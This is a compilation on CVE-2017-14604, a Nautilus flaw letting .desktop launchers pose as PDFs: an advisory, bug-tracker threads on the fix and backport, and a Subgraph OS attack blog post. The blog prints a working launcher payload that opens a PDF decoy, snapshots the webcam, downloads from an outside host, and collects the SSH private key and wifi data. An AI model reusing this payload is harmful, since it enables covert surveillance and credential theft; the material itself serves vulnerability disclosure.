# CVE-2017-14604

| **Name** | CVE-2017-14604 |
| --- | --- |
| **Description** | GNOME Nautilus before 3.23.90 allows attackers to spoof a file type by using the .desktop file extension, as demonstrated by an attack in which a .desktop file's Name field ends in .pdf but this file's Exec field launches a malicious "sh -c" command. In other words, Nautilus provides no UI indication that a file actually has the potentially unsafe .desktop extension; instead, the UI only shows the .pdf extension. One (slightly) mitigating factor is that an attack requires the .desktop file to have execute permission. The solution is to ask the user to confirm that the file is supposed to be treated as a .desktop file, and then remember the user's answer in the metadata::trusted field. |

Package        : nautilus
CVE ID         : CVE-2017-14604
Debian Bug     : 860268

Christian BoxdÃ¶rfer discovered a vulnerability in the handling of
FreeDesktop.org .desktop files in Nautilus, a file manager for the GNOME
desktop environment. An attacker can craft a .desktop file intended to run
malicious commands but displayed as a innocuous document file in Nautilus. An
user would then trust it and open the file, and Nautilus would in turn execute
the malicious content. Nautilus protection of only trusting .desktop files with
executable permission can be bypassed by shipping the .desktop file inside a
tarball.

For the oldstable distribution (jessie), this problem has not been fixed yet.

For the stable distribution (stretch), this problem has been fixed in
version 3.22.3-1+deb9u1.

For the testing distribution (buster), this problem has been fixed
in version 3.26.0-1.

For the unstable distribution (sid), this problem has been fixed in
version 3.26.0-1.

We recommend that you upgrade your nautilus packages.

| [Description](show_bug.cgi?id=777991#c0)  Christian BoxdÃ¶rfer    2017-01-31 16:46:12 UTC  ``` Created [attachment 344652](attachment.cgi?id=344652 "Screenshot of malicious .desktop file displayed in Nautilus") [[details]](attachment.cgi?id=344652&action=edit "Screenshot of malicious .desktop file displayed in Nautilus") Screenshot of malicious .desktop file displayed in Nautilus  How to reproduce:  1. Create a file called malware.desktop   2. Add the following content to it:  [Desktop Entry] Name=CV.pdf Exec=sh -c 'touch ~/MALWARE_WAS_HERE' Terminal=false Icon=x-office-document Type=Application Categories=Office  3. Make it executable  Nautilus displays the file like that: (see attachment)  Once the user opens the file the Exec entry is executed without any confirmation. By hiding the filename and therefore also the filename extension users can easily be tricked to execute arbitrary code when some ships files like that in an archive which preserves execute permissions. Especially since nowadays Nautilus even extracts archives with a simple double click.  How to fix it:  Maybe by don't hiding the filename for .desktop files at all. ``` [Comment 1](show_bug.cgi?id=777991#c1)  Christian BoxdÃ¶rfer    2017-01-31 17:20:22 UTC  ``` For reference, this bug also applies to other file managers: <https://github.com/lxde/pcmanfm-qt/issues/449> <https://github.com/mate-desktop/caja/issues/727> <https://github.com/linuxmint/nemo/issues/1404> ``` [Comment 2](show_bug.cgi?id=777991#c2)  Nate Graham    2017-01-31 18:40:31 UTC  ``` I can reproduce the issue. This is a really, really bad security hole. .desktop files shouldn't be able to masquerade as anything else when viewed by the file manager. macOS Finder and Windows Explorer both have security measures put in place to prevent spoofing file extensions in this manner; Nautilus should, too. ``` [Comment 3](show_bug.cgi?id=777991#c3)  Carlos Soriano    2017-02-01 17:23:37 UTC  ``` The extension is just a detail (as it would putting an emblem or so) which doesn't really communicate or stop the user to run it.  I tried the steps in here and I cannot reproduce, the mimetype is detected as pdf and cannot open it. But this is highly different per system/user, so not something we can rely on.  The solution we came up with is to not allow desktop file activation at all if the desktop file was not created by us or acknowledged by the user via dialog of trusting it. ``` [Comment 4](show_bug.cgi?id=777991#c4)  Carlos Soriano    2017-02-06 17:52:27 UTC  ``` Created [attachment 345047](attachment.cgi?id=345047 "mime-actions: use file metadata for trusting desktop files") [[details]](attachment.cgi?id=345047&action=edit "mime-actions: use file metadata for trusting desktop files") [[review]](review?bug=777991&attachment=345047) mime-actions: use file metadata for trusting desktop files  Currently we only trust desktop files that have the executable bit set, and don't replace the displayed icon or the displayed name until it's trusted, which prevents for running random programs by a malicious desktop file.  However, the executable permission is preserved if the desktop file comes from a compressed file.  To prevent this, add a metadata::trusted metadata to the file once the user acknowledges the file as trusted. This adds metadata to the file, which cannot be added unless it has access to the computer.  Also remove the SHEBANG "trusted" content we were putting inside the desktop file, since that doesn't add more security since it can come with the file itself. ``` [Comment 5](show_bug.cgi?id=777991#c5)  Carlos Soriano    2017-02-06 17:53:55 UTC  ``` [Attachment 345047](attachment.cgi?id=345047 "mime-actions: use file metadata for trusting desktop files") [[details]](attachment.cgi?id=345047&action=edit "mime-actions: use file metadata for trusting desktop files") pushed as [1630f53](https://git.gnome.org/browse/nautilus/commit/?id=1630f53) - mime-actions: use file metadata for trusting desktop files ``` [Comment 6](show_bug.cgi?id=777991#c6)  Carlos Soriano    2017-03-04 11:50:15 UTC  ``` *** [Bug 779547](show_bug.cgi?id=779547 "RESOLVED DUPLICATE - Deceptive Display of Dangerous File") has been marked as a duplicate of this bug. *** ``` [Comment 7](show_bug.cgi?id=777991#c7)  Donncha Ã Cearbhaill    2017-09-07 11:56:52 UTC  ``` Carlos, thank you for resolving this security issue. Is there a plan to backport this fix to the 3.22.x branch to make it available for Debian users? Debian wants to backport this patch as a security update [1].  I think that a CVE should be requested for this issue to help all distros coordinate on the deployment of the patch for this vulnerability. It is possible to trivially exploit this issue in-the-wild [1]. I'm happy to file the CVE request if you would like me too.

If it's something that will be of convenience to Debian I'm fine doing a release, but someone will have to do the backport since I believe there will be conflicts.  I'm fine if you want to file a CVE indeed. ``` [Comment 9](show_bug.cgi?id=777991#c9)  Donncha Ã Cearbhaill    2017-09-07 13:03:16 UTC  ``` Phil Wyett has provided a debdiff of the .desktop fix backported to 3.22.3.

Sorry, I just remember this has UI changes. This cannot be accepted upstream since we don't have UI changes in stable branches.  Should be fine as downstream patch, and you might want to cherry-pick translations for those string changes too. ``` [Comment 11](show_bug.cgi?id=777991#c11)  Donncha Ã Cearbhaill    2017-09-07 14:45:56 UTC  ``` Okay, thank you. I'll follow-up with Debian about downstream backport. ``` [Comment 12](show_bug.cgi?id=777991#c12)  Donncha Ã Cearbhaill    2017-09-16 11:45:46 UTC  ``` Created [attachment 359888](attachment.cgi?id=359888 "Backported patch containing cherry-picked translations") [[details]](attachment.cgi?id=359888&action=edit "Backported patch containing cherry-picked translations") [[review]](review?bug=777991&attachment=359888) Backported patch containing cherry-picked translations ``` [Comment 13](show_bug.cgi?id=777991#c13)  Donncha Ã Cearbhaill    2017-09-16 11:46:02 UTC  ``` I've updated a backport of your patch to include translations for the "Trust and _Launch" string.  It looks like .gmo file are built and included in the upstream release? I'm trying to rebuild the gmo files with the new translations during the Debian package building process. Do you know what modifications I need to make in order to force a rebuild of the gmo files?  Phil Wyett opened a ticket on the Redhat bug tracker in order to get this fix backported to RHEL and Fedora too. ``` [Comment 14](show_bug.cgi?id=777991#c14)  Carlos Soriano    2017-09-16 14:31:05 UTC  ``` Cool. No I don't know off hand about gmo files, a wild guess: maybe you need to distcheck?  Otherwise I'm sure someone in #gnome-hackers could help you, I know few who cherry picked translations in the past as downstream patches. ``` [Comment 15](show_bug.cgi?id=777991#c15)  Cedric Buissart    2017-09-18 08:03:08 UTC  ``` Hi, Any news on the CVE assignment ?

I requested the CVE from the Distributed Weakness Filing project. I don't want to cause any confusion by requesting a CVE for the same issue twice. If you think that it is not a problem, the please feel free to request one from Red Hat instead. ``` [Comment 17](show_bug.cgi?id=777991#c17)  Michael Catanzaro    2017-09-18 13:08:32 UTC  ``` Turnaround time from DWF is generally upwards of four months in my experience (I've used it three times). It will come through eventually, and you will have a duplicate if you get impatient and request one somewhere else. ``` [Comment 18](show_bug.cgi?id=777991#c18)  Cedric Buissart    2017-09-20 08:42:08 UTC  ``` 4 months would mean we would hit the anniversary of the discovery before getting a CVE :) I sent a request to mitre.org, stating that there may be a request on the fly already & got a quick answer with a CVE ID.   This vulnerability is now known as CVE-2017-14604 : <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14604>  Hopefully, DWF will check around here before assigning anything. ``` [Comment 19](show_bug.cgi?id=777991#c19)  Carlos Soriano    2017-09-20 08:56:41 UTC  ``` (In reply to Cedric Buissart from [comment #18](show_bug.cgi?id=777991#c18)) > 4 months would mean we would hit the anniversary of the discovery before > getting a CVE :) > I sent a request to mitre.org, stating that there may be a request on the > fly already & got a quick answer with a CVE ID.  >  > This vulnerability is now known as CVE-2017-14604 : > <https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14604> >  > Hopefully, DWF will check around here before assigning anything.  Reading the CVE, it points to Nautilus in GitHub. That is not the canonical source and could be removed at any point. Use git.gnome.org instead. ``` [Comment 20](show_bug.cgi?id=777991#c20)  Donncha Ã Cearbhaill    2017-09-20 11:08:31 UTC  ``` Cedric, thank you for getting the CVE issued. That's much better than waiting for the anniversary :)   I'm following up with Debian to try and get this issue resolved downstream. ``` [Comment 21](show_bug.cgi?id=777991#c21)  Alexander Kurtz    2017-10-08 15:22:09 UTC  ``` Hey, @Carlos Soriano: I just read the patch and can't help to wonder what you actually mean by "use file metadata". What does  +            nautilus_file_set_metadata (parameters->file, NAUTILUS_METADATA_KEY_DESKTOP_FILE_TRUSTED, +                                        NULL, +                                        "yes");  actually do? Does it somehow attach a trusted flag to file itself (via xattrs?)? Or does Nautilus keep a path-based whitelist somewhere? Because that would be dangerous... ``` [Comment 22](show_bug.cgi?id=777991#c22)  Alexander Kurtz    2017-10-08 16:07:47 UTC  ``` Ok, I tested this:  $ nautilus --version GNOME nautilus 3.26.0 $   Let's see if the "trusted" flag is associated with the file itself or the path:  $ printf '[Desktop Entry]\nName=42\nExec=gnome-terminal\nType=Application' > foo.desktop $ ls -l total 4 -rw-r--r-- 1 alexander alexander 60 Oct  8 17:57 foo.desktop $ # nautilus shows one file "foo.desktop" $ chmod +x foo.desktop  $ ls -l total 4 -rwxr-xr-x 1 alexander alexander 60 Oct  8 17:57 foo.desktop $ # nautilus still shows one file "foo.desktop" $ # use nautilus to start "foo.desktop" and mark it as trusted $ # nautilus starts gnome-terminal and now displays one file "42" $ ln foo.desktop bar.desktop $ ls -li foo.desktop bar.desktop  12218402 -rwxr-xr-x 2 alexander alexander 60 Oct  8 17:57 bar.desktop 12218402 -rwxr-xr-x 2 alexander alexander 60 Oct  8 17:57 foo.desktop $ # nautilus shows two files, "42" and "bar.desktop"  It appears to be path-associated, since only "foo.desktop" is displayed as "42" even though "foo.desktop" and "bar.desktop" are the same file.  Let's try something:  $ rm --verbose foo.desktop bar.desktop  removed 'foo.desktop' removed 'bar.desktop' $ printf '[Desktop Entry]\nName=42\nExec=gnome-terminal\nType=Application' > foo.desktop $ chmod +x foo.desktop  $ # nautilus displays one file "42" $   Wow, so removing the "trusted" file and then re-creating it in the same path bypasses this new "trusted" flag. All that's left is the executable bit which isn't enough as shown by the initial bug report.  TL;DR: User using nautilus for some time and sometimes "trusting" .desktop files will have an ever growing (is there a way to clear it?) whitelist of paths where the executable bit is again all that's needed for pwnage. Now, combine this with XDG_DOWNLOAD_DIR and this becomes a problem... ``` [Comment 23](show_bug.cgi?id=777991#c23)  Alexander Kurtz    2017-10-08 16:10:17 UTC  ``` Oh, and also this:  $ printf '[Desktop Entry]\nName=42' > baz.desktop $ ls -l total 4 -rw-r--r-- 1 alexander alexander 23 Oct  8 18:08 baz.desktop $ # nautilus displays one file "42" $   So for .desktop files not containing an Exec= (or Type=Application) setting neither the executable bit nor the new "trusted flag" check seem to be active. Not yet sure if this is exploitable, but it sure seems fishy. ``` [Comment 24](show_bug.cgi?id=777991#c24)  Alexander Kurtz    2017-10-08 16:27:13 UTC  ``` Yup, can at least be used for tracking:  $ printf '[Desktop Entry]\nName=CV.pdf\nIcon=x-office-document\nType=Link\nURL=<https://gnome.org>' > baz.desktop $ ls -l baz.desktop  -rw-r--r-- 1 alexander alexander 82 Oct  8 18:20 baz.desktop $ # nautilus shows a file "CV.pdf" which looks like a symbolic link $ # clicking on "CV.pdf" opens a web browser showing gnome.org  So, reading the spec [0] for five minutes gave a privacy leak. oO  Why exactly does nautilus even parse .desktop at all? Isn't starting applications more of Gnome Shell's domain?  [0] <https://developer.gnome.org/desktop-entry-spec/> ``` [Comment 25](show_bug.cgi?id=777991#c25)  Alexander Kurtz    2017-10-08 16:37:30 UTC  ``` Hurray for "be liberal in what you accept from others" (i.e. just ignore the spec, we don't need no "Type="!)  $ cat baz.desktop  [Desktop Entry] Name=CV.pdf Icon=x-office-document URL=<http://gnome.org> $ ls -l baz.desktop  -rw-r--r-- 1 alexander alexander 72 Oct  8 18:32 baz.desktop $ # nautilus shows a file "CV.pdf" which looks like a regular PDF $ # clicking on "CV.pdf" opens a web browser showing gnome.org  Nautilus 3.26. No x-bit or trusted flag. Visually indistinguishable from a regular PDF. Can open arbitrary URLs. ``` [Comment 26](show_bug.cgi?id=777991#c26)  Alexander Kurtz    2017-10-08 17:38:31 UTC  ``` Another vector to the same goal, abusing legacy compatibility [0]:  $ cat baz.desktop  [Desktop Entry] Name=CV.pdf Icon=x-office-document Type=URL Exec=<http://gnome.org> $ ls -l baz.desktop  -rw-r--r-- 1 alexander alexander 82 Oct  8 19:31 baz.desktop $ # nautilus shows a file "CV.pdf" which looks like a regular PDF $ # clicking on "CV.pdf" opens a web browser showing gnome.org $   [0] <https://github.com/GNOME/nautilus/blob/3.26.0/src/nautilus-link.c#L383> ``` [Comment 27](show_bug.cgi?id=777991#c27)  Alexander Kurtz    2017-10-08 18:27:16 UTC  ``` For the record, the "trusted metadata" gets stored to (after a frankly insane function call tour through Nautilus and GLib) to a file under ~/.local/share/gvfs-metadata, so removing this directory should reset all "trusted" markings.   And yeah, it's definitely path based:  alexander@shepard:~/.local/share/gvfs-metadata$ hd root-8daa6d16.log  00000000  da 1a 6a 6f 75 72 01 00  8d aa 6d 16 00 00 80 00  |..jour....m.....| 00000010  00 00 00 01 00 00 00 38  c0 78 97 05 00 00 00 00  |.......8.x......| 00000020  59 da 6b 86 00 2f 68 6f  6d 65 2f 77 6f 6d 2f 62  |Y.k../home/wom/b| 00000030  61 7a 2e 64 65 73 6b 74  6f 70 00 74 72 75 73 74  |az.desktop.trust| 00000040  65 64 00 79 65 73 00 00  00 00 00 38 00 00 00 00  |ed.yes.....8....| 00000050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................| * 00008000  So, if you ever mark a launcher as trusted and then remove it, be sure to tell GVFS about it (does Nautilus at least do this?). Otherwise this specific launcher path has just gained a vulnerability for [Bug 777991](show_bug.cgi?id=777991 "RESOLVED FIXED - Nautilus hides filename for .desktop files with execute permission") / CVE-2017-14604. It's not hard to imagine an attack using this: Get the user to extract a good app in $XDG_DOWNLOAD_DIR and launch it, marking the launcher as trusted. (Much) later, get the user to extract a malicious tarball to the same directory. Boom. ``` [Comment 28](show_bug.cgi?id=777991#c28)  Carlos Soriano    2017-10-09 11:03:34 UTC  ``` Yes, that's how it works. Obviously there is an usability compromise.

Subject: .desktop files can hide malware in Nautilus
Date: Thu, 13 Apr 2017 12:20:35 -0700
```
Package: nautilus
Version: 3.22.3-1

There is a bug in Nautilus that makes it possible to disguise a
malicious script as an innocent document, like a PDF or ODT, that gets
executed when the user opens it.

The upstream nautilus issue [1] has already been resolved, and will be
released in nautilus 3.24. But since this is an important security
issue, I think this patch should be backported so that it's fixed in
older versions of Debian.

See this blog post [2] for more about how this bug allows attackers to
compromise the security-focused Debian-based distro Subgraph.

Thanks for raising this issue in Debian!

Is there any plan upstream to backport this fix to their 3.22.x
branch, and/or to request a CVE?

Did you personally check whether it's straightforward to backport the
fix to 3.22?

Cheers,

Hi,

Seeing this bug. I have backported from the upstream patch (hash issue with
upstream diff) for testing purposes and all looks good. If anyone wishes to
test, a debdiff is attached.

The debdiff is prepared with a 'stretch-pu' in mind.

If any edits are required, please do not hesitate to let me know.

Regards

Phil

Hi,

Thank you Phil for providing a backport patch. What is the next step
needed to get this fix released as a backport? The .desktop security
issue is widely know and can be exploited in the wild [1]. IMO this
fixed should be made available as soon as possible.

Regards,
Donncha

IMO the next step is to find out the answer to "Is there any plan
upstream to backport this fix to their 3.22.x branch, and/or to
request a CVE?": if this problem is as severe as it sounds, then it
should be tracked as a security issue and fixed cross-distro, rather
than patched in only the distros that are lucky enough to have users
who care about such things.

The upstream developer has indicated that he willing to make a 3.22.x
release if a backport patch is provided. I've sent him a link to Phil
Wyett's debdiff which I hope is acceptable.

I will also file a CVE request for this issue which should help to
coordinate the release of this fix for other distros.

The upstream developer has now indicated that they will not be
backporting the fix to 3.22.x. They have a policy of not backporting
fixes which involve UI changes in stable branches.

Will Debian backport this issue themselves? I have requested a CVE which
I hope will help other distros to coordinate their fixes.

Is there anything that I can do to help get this backport patch
deployed? This issue can be exploited in the wild and I think it should
be fixed as soon as possible.

I am still waiting for a response for my CVE request.

It's not just a UI change but a translatable string change. The new
dialog that users will have to use to mark .desktop's as trusted will
be untranslated.

Therefore, if you want this feature, you will need to use Nautilus >=
3.24 which means you will need to upgrade to buster.

Thanks,

I understand backporting is more difficult when there are user facing UI
and localisation changes. AFAIK the only new translatable string in the
patch is "Trust and _Launch". Would it be possible to include the
translations for that string with this backport patch?

Personally I don't consider this change a *feature*, it is a fix for a
serious security issue affecting Debian stable users (and Tails). The

Hi,

Please note that the debdiff I provided was essentially a raw backport for
testing and I thought it may have issues. It was never meant as a 'here it is,
all done' patch ready for submission as a stable update.

I am a little busy at the moment, but if I can help here, I will.

Regards

Phil

Hi,

Has anyone looked at how Red Hat are approaching this issue? RHEL 7.4 is gnome
3.22 and using nautilus 3.22.3 I believe.

The corresponding Red Hat bug is at
<https://bugzilla.redhat.com/show_bug.cgi?id=1442231>. Unfortunately there
has not been any progress with fixing this issue in RHEL or Fedora 25
either.

Thanks for creating the original patch. I'm not experienced with Debian
packing, but I will try to test your patch later today.

Hi,

Being that this is tagged against Fedora 27 in Red Hats bugzilla. I have cloned
the bug and assigned it to RHEL 7.4.

<https://bugzilla.redhat.com/show_bug.cgi?id=1491425>

Hi,

I have cherry-picked the translations for the string "Trust and _Launch"
and created an updated patch and debdiff containing those strings in the
respective .po files.

Unfortunately it looks like the Debian package does not rebuild the
.gmo/.mo files from the .po files during the build. Instead it uses the
pre-built .gmo files which have be include in the upstream release. As a
result the added translation are not included with the built package.

I'm not sure what is the best way to resolve this:

1. Add gettext build dependency and rebuild the .mo files
3. Ask upstream maintainer to make a 3.22 release contain the patch and
translation
3. Create release without translation for that one string

Phil, I have tested your patch on Tail 3.1 (based on Debian Jessie) and
it is functioning as expected.

I have created a backport patch targeting Nautilus 3.22.3 which contains
the cherry-picked translations for the new UI string.

It adds a line to the debian/control file to remove the pre-built .mo
translation files which were included in the upstream source release. I
also needed to add gettext as a build dependency. With this patch the
.mo/.gmo files should be rebuilt with the new strings during the Debian
package build.

I have tested the backported Nautlius package with Tails 3.1 which is
based on Debian stable. The English and localised interface is displayed
correctly.

Ideally this backport would be ready for Tails 3.2 which is schedule to
be released early next week.

Please let me know if I need to make any further changes.

Regards,
Donncha

Hi,

Sorry, been busy, so not had chance to get back to this.

Hi,

Now that the CVE ([CVE-2017-14604](https://security-tracker.debian.org/tracker/CVE-2017-14604)) has been issued and this would (well, if it
ever does) pass into debian as a security update. I have updated the debdiff
accordingly. See attached.

Link to CVE: <http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14604>

If any tweaks need to be made. Please let me know via this bug report.

If anyone has issues running with this patch applied. Please be sure to add
information to this bug report.

Regards

Phil

Oops... Massive sleep derived error. debdiff has been forwarded to security team
on another email that did not have a massive recipient list and had them on it.

Apologies for the error.

Hi Phil,

the debdiff looks good, but please use +deb9u1 as suffix for the version
number. You may then proceed with the upload to security-master.

Note that since it's the first nautilus security upload to stretch it needs to
be build with -sa.

You can safely upload a source-only upload, but you need to remove the
.buildinfo from the changes file before uploading.

Regards,

I'll take care of the upload. Do you intend to backport the patches to Jessie?

Hi,

I will look at it. But, I just know it will be a nightmare if possible at all. I
shall add info to the bug report probably mod next week.

Hi all,

I have looked at both 'jessie' and 'wheezy'. Both are not affected by this
specific issue and have mechanism(s) like stretch (with update) and newer
versions of nautilus that display and require input when confronted with certain
file types.

Screenshot attached showing how 'jessie' and 'wheezy' react to the example
attack desktop file.

If someone else wished to validate this, please feel free.

Regards

Phil

nautilus 3.22 introduced integrated (almost silent) tarball
decompression support which makes the test case for this vulnerability
a lot simpler.

Thanks,

# Breaking the Security Model of Subgraph OS

Posted April 11, 2017 in [hackers](../../../tags/hackers) [linux](../../../tags/linux) [qubes](../../../tags/qubes) [subgraph](../../../tags/subgraph)

I recently traveled to Amsterdam to attend a meeting with Tor Project staff, volunteers, and other members of the wider Tor community. Before trips like this, I prepare a separate travel computer, only bringing with me data and credentials that I might need during my trip. My primary laptop runs [Qubes](https://www.qubes-os.org/), but this time I decided to install [Subgraph OS](https://subgraph.com/sgos/index.en.html) on my travel laptop. I had only briefly messed with it before, and there’s no better way to learn about a new operating system than by forcing yourself to actually use it for a few days.

Subgraph OS is an “adversary resistant computing platform.” It’s similar to [Tails](https://tails.boum.org/) in that it’s based on Debian and all traffic is forced through Tor (that’s changing though: there’s now basic support for [clearnet Chromium](https://subgraph.com/sgos/documentation/clearnet-chromium/) and [OpenVPN](https://twitter.com/subgraph/status/846455144648785921)). It uses a grsecurity Linux kernel, and many apps run in “oz sandboxes”, a homebrew sandbox solution that protects you even if an attacker manages to exploit a bug in one of these apps. Subgraph OS also includes the Subgraph Firewall, an application firewall similar to Little Snitch for macOS — something that’s pretty awesome, and hasn’t really existed in the Linux ecosystem before. Basically, it’s designed to be an easy-to-use Linux distro that’s extremely secure.

Joanna Rutkowska, the brains behind Qubes, was at the Tor meeting as well. We sat down together and started poking at Subgraph OS to see if we could break its security model, and we succeeded! After we discovered weaknesses, I polished them into a working exploit.

Subgraph publishes a user manual called the Subgraph OS Handbook. You can find the code for it [on GitHub](https://github.com/subgraph/sgos_handbook). I made a fake website with a link to download this git repository, compressed as a zip file. A realistic targeted attack would probably use different bait — perhaps an attacker would send a journalist some juicy documents — but the point is, the user downloads something from a website, or maybe from their email, and then double-clicks a document to open it. Subgraph OS, with its grsecurity Linux kernel and oz sandboxes, is supposed to prevent malicious documents from taking over your computer, but in this case it doesn’t.

I reported what we found to the Subgraph developers and offered to give them time to resolve the issues before I published this post. They said that none of what I reported was surprising, that Subgraph OS is still in alpha, and that they don’t recommend that people use it yet. But that’s funny, because [their website](https://archive.is/A1OCP) doesn’t seem to include that warning — it describes a list of amazing security features, ending with, “Try the Subgraph OS Alpha today. You can install it on a computer, run it as a live-disk, or use it in a VM.”

They didn’t ask for more time, and they haven’t resolved the issues yet.

To be fair, Subgraph OS *is* still in alpha, and already it’s more secure by default than many other Linux distros. This same attack also works against Tails, Debian, Ubuntu, Fedora, Arch, etc. (not Qubes though).

**How oz sandboxing works**

Subgraph comes with sandboxes for 22 applications — things like Tor Browser, OnionShare, Evince (PDF reader), Eye of GNOME (image viewer), Icedove (email client), and VLC (media player). If you run a program that doesn’t have an oz sandbox (such as Nautilus, the built-in file manager, or anything that isn’t one of those 22 programs), then it runs unsandboxed, with access to all your user data.

If you open a malicious PDF that exploits a bug in Evince, the sandbox will limit what the attacker can do. It blocks internet access, so the attacker can’t phone home. It restricts what Linux system calls can be made to only what evince needs to work. It limits access to the filesystem. On a normal Linux computer, if an attacker hacks Evince, they can access all of the user’s data in their home directory (documents, email, PGP and SSH keys, etc.), but the Evince oz sandbox prevents the attacker from accessing any documents except the one that the user opened.

Oz sandboxes themselves seem pretty good at a glance. Though I did find some information leakage. I discovered that /etc is readable. So if you run ls /etc/NetworkManager/system-connections, you can see a list of the computer’s saved wifi networks, even within the sandbox. In oz sandboxes that allow internet access (like the Tor Browser one), this information could be sent back to the attacker — there’s likely other juicy data in there too. When I reported this, the Subgraph devs pointed me to [this year-old github issue](https://github.com/subgraph/oz/issues/20), showing that they’ve thought about it.

**The problem with Subgraph OS’s sandbox approach**

Oz sandboxes are similar to [macOS app sandboxes](https://developer.apple.com/library/content/documentation/Security/Conceptual/AppSandboxDesignGuide/AboutAppSandbox/AboutAppSandbox.html) — they lock down what specific apps can do so that if those apps get hacked, the attacker is hopefully stuck in the sandbox with very limited access. While this is great, it’s an incomplete solution to endpoint security.

For one thing, most of the programs you run in Subgraph *aren’t* sandboxed. Most of GNOME isn’t. Nautilus, the graphical file manager, isn’t, and neither is the terminal app. If an attacker can trick a user into running an unsandboxed script in either Nautilus (what my attack does) or in the terminal, it’s game over. If the user installs custom software that doesn’t have an oz profile, and an attacker exploits this software, it’s also game over.

An attacker that gets unsandboxed remote code execution in Subgraph OS has a lot of access. They can see, and exfiltrate, all of the user’s data: PGP keys, SSH keys, stored email, documents, password databases, and everything else. They can listen from the microphone and watch through the webcam. They can learn the network interface’s MAC address, and see nearby wifi access points and bluetooth devices, which can be used to deanonymize the user. They can install a persistent backdoor in your computer.

For another, there’s no way to compartmentalize different parts of your computer for different purposes like you can in Qubes. You can’t make a separate sandbox for working with some untrusted documents, or for keeping certain secrets extra secure, or for managing different anonymous identities online. All of your data in Subgraph OS, at some point, risks getting accessed by unsandboxed programs.

I won’t go into detail about how Qubes does it except to say that it’s a somewhat opposite approach. You have a thin, unsandboxed layer that has total control over your computer, and then *everything* else is run inside of sandboxes. Qubes also protects sandboxed apps from reading potentially sensitive data off of your clipboard (unless you want it to), and it protects your administrative domain from untrusted input coming from your network drivers and your USB stack. (It’s the only operating system that I’m aware of that, out-of-the-box, protects against BadUSB attacks.)

**Hacking the Free Desktop with .desktop files**

In the free desktop world, application launchers are .desktop files. Every GUI application on your Linux box has a desktop file, just check `/usr/share/applications`. If you’re creating a custom application launcher, inside the .desktop file you specify the name of the application, an icon, as well as what to run when you execute it.

If you open Nautilus and browse to a folder with a .desktop file in it, there are two ways it can get displayed.

* If the file isn’t executable, Nautilus doesn’t trust it and shows the full original filename, including the .desktop extension, and a default icon.
* If the file is executable, Nautilus trusts it and shows whatever name and icon is specified in the file. This is why the exploit I built was zipped up, so I could ensure that my malicious .desktop file is executable.

It’s important to note that this is a *huge gaping security hole in Nautilus*. All Linux users that use Nautilus (including everyone who uses GNOME, Unity, Cinnamon) are vulnerable to getting tricked this way. This bug was [reported to Nautilus](https://bugzilla.gnome.org/show_bug.cgi?id=777991) in January, and it has now been resolved (by, I believe, popping up a warning asking if you trust the source of the desktop launcher before executing it), but the fix won’t be released until Nautilus 3.24.

Debian Stretch ships 3.22.3; Fedora 25 ships 3.22.2; Ubuntu 16.10 ships 3.20.3; Ubuntu 17.04 ships 3.20.4. So it might be some time before this fix actually makes it into distros that people use. The Subgraph devs pointed me to [this recent github issue](https://github.com/subgraph/subgraph-os-issues/issues/227), showing that they’ve thought about this issue too. They also said they’re planning on auditing the Nautilus source code.

The exploit I created is a file called `sgos_handbook.pdf.desktop` (though I could have named it `malware.desktop` and it would have looked the same in Nautilus). Here’s what’s inside of it. Note that the name is set to `sgos_handbook.pdf`, and the icon is `gnome-mime-application-pdf` which is the default icon for PDFs in Subgraph — these two things make it so you can’t tell that this isn’t a PDF when viewing it in Nautilus. Also, of course, note that it’s set to execute a malicious shell script when it’s run.

```
#!/usr/bin/env xdg-open
[Desktop Entry]

Name=sgos_handbook.pdf
Exec=sh -c 'ROOT=$(dirname $(dirname $(find $HOME -type f -name sgos_handbook.pdf.desktop)) |head -n1); evince $ROOT/static/sgos_handbook.pdf; mkdir $HOME/.config/tools; cd $HOME/.config/tools; torify apt download fswebcam; dpkg-deb -xv `ls fswebcam_*.deb` .; ./usr/bin/fswebcam -r 640x480 $HOME/webcam-snapshot.jpg; torify wget https://static.wixstatic.com/media/6a4a49_4e03bc224328475ea2e20dddaf9d0fda~mv2_d_2121_1414_s_2.jpg -O $HOME/attacker-can-drop-files-from-the-internet.jpg; echo "ifconfig output:" >> $HOME/pwnlog.txt; /sbin/ifconfig >> $HOME/pwnlog.txt; echo >> $HOME/pwnlog.txt; echo "tor exit node info:" >> $HOME/pwnlog.txt; torify curl https://ifconfig.co/json >> $HOME/pwnlog.txt; echo >> $HOME/pwnlog.txt; echo >> $HOME/pwnlog.txt; echo "ssh public and secret keys:" >> $HOME/pwnlog.txt; cat $HOME/.ssh/id_rsa.pub >> $HOME/pwnlog.txt; echo >> $HOME/pwnlog.txt; cat $HOME/.ssh/id_rsa >> $HOME/pwnlog.txt; echo >> $HOME/pwnlog.txt; echo "nearby wifi:" >> $HOME/pwnlog.txt; /sbin/iwlist $INTERFACE scan >> $HOME/pwnlog.txt; echo >> $HOME/pwnlog.txt; echo "saved wifi networks:" >> $HOME/pwnlog.txt; ls /etc/NetworkManager/system-connections >> $HOME/pwnlog.txt; echo >> $HOME/pwnlog.txt;'

```

Here’s a more human-readable, and commented, version of the payload:

```

**Using .desktop Files to Break Out of a Sandbox**

When you open a PDF in Subgraph OS, it opens an Evince oz sandbox that only has access to that one document. However, some sandboxes give you write access to an entire folder. For example, the Tor Browser sandbox lets you read and write to `~/Downloads/TorBrowser`, and the LibreOffice sandbox lets you read and write to `~/Documents/LibreOffice`.

If you can get sandboxed remote code execution in one of these sandboxes, like by using a Tor Browser or LibreOffice exploit, you can then potentially escalate privileges to get unsandboxed remote code execution by modifying files in those directories.

For example, lets say the user downloads a malicious Word document and double clicks it in Nautilus. Subgraph OS will open a LibreOffice oz sandbox and give it access to that document (let’s say, `~/Downloads/TorBrowser/resume.docx`). Let’s also assume that the user has some legitimate documents, like maybe `~/Documents/LibreOffice/draft-proposal.odt`.

The payload of the malicious resume.docx could rename draft-proposal.odt to something else, like maybe make it a hidden file called `.DS_Store`, and then create a new file, `draft-proposal.odt.desktop` and make it executable. Later, when the user double-clicks what looks like `draft-proposal.odt` in Nautilus, the attacker escapes the sandbox. (And of course, the payload can even clean up after itself — move `.DS_Store` back to `draft-proprosal.odt` and delete `draft-proposal.odt.desktop`, after installing a backdoor of course.)

**Bypassing the Subgraph Firewall**

